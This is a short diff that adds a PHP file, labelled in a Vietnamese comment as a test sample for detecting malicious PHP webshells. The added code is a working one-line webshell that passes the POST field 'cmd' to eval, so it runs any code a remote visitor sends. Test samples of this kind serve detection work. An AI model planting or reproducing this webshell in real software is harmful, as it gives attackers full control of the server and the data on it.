@@ -1,0 +1,6 @@
+<?php
+// Tệp tin kiểm thử phát hiện Webshell PHP độc hại
+if (isset($_POST['cmd'])) {
+    eval($_POST['cmd']);
+}
+?>
